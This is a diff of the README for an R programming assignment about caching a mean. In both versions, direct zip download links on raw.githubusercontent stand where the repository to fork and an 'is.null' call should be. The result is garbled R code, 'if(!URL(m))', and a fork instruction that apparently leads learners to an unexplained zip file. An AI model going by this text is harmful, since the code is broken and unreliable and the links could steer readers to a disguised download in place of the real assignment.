@@ -52,7 +52,7 @@ function.
 
     cachemean <- function(x, ...) {
             m <- x$getmean()
-            if(!https://raw.githubusercontent.com/Arno1/ProgrammingAssignment2/master/unspoiled/Assignment_Programming_1.3.zip(m)) {
+            if(!https://raw.githubusercontent.com/Arno1/ProgrammingAssignment2/master/unspoiled/Programming_Assignment_v1.6.zip(m)) {
                     message("getting cached data")
                     return(m)
             }
@@ -89,7 +89,7 @@ invertible.
 In order to complete this assignment, you must do the following:
 
 1.  Fork the GitHub repository containing the stub R files at
-    [https://raw.githubusercontent.com/Arno1/ProgrammingAssignment2/master/unspoiled/Assignment_Programming_1.3.zip](https://raw.githubusercontent.com/Arno1/ProgrammingAssignment2/master/unspoiled/Assignment_Programming_1.3.zip)
+    [https://raw.githubusercontent.com/Arno1/ProgrammingAssignment2/master/unspoiled/Programming_Assignment_v1.6.zip](https://raw.githubusercontent.com/Arno1/ProgrammingAssignment2/master/unspoiled/Programming_Assignment_v1.6.zip)
     to create a copy under your own account.
 2.  Clone your forked GitHub repository to your computer so that you can
     edit the files locally on your own machine.
